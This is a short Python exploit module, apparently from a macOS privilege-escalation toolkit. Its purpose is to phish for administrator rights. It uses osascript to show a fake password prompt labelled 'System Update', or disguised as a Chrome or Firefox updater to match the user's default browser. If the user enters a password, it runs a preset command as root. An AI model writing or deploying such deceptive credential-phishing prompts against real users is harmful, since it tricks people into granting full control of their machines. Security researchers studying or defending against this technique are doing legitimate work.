"""phishes for sudo with AppleScript"""
from .general import DEFAULT_COMMAND, default_browser, osascript, random_string

try:
    input = raw_input
except NameError:
    pass

__cve__ = ""
__credits__ = "thehappydinoa"

BROWSERS = {
    "com.google.chrome": "Google Chrome Updater",
    "org.mozilla.firefox": "Firefox Updater"
}


def admin_prompt(app=None, prompt="System Update", command="echo hello"):
    """prompts with administrator privileges"""
    rand = random_string()
    if app:
        payload = """osascript -e 'tell app "{app}" to activate' -e 'tell application "{app}" to do shell script "{command}; echo {success}" with prompt "{prompt}" with administrator privileges'""".format(
            app=app, prompt=prompt, command=command, success=rand)
    else:
        payload = """osascript -e 'do shell script "{command}; echo {success}" with prompt "{prompt}" with administrator privileges'""".format(
            prompt=prompt, command=command, success=rand)
    print("Prompting: " + prompt)
    response = osascript(payload)
    print(response)
    return rand in response


def vulnerable(version):
    """checks vulnerability"""
    return "y" == input("[USER INTERACTION] Do you want to try to phish for sudo? (y/N): ")[0].lower()


def run():
    """runs exploit"""
    browser = default_browser()
    if browser and browser in BROWSERS.keys():
        return admin_prompt(prompt=BROWSERS.get(browser), command=DEFAULT_COMMAND)
    return admin_prompt(command=DEFAULT_COMMAND)
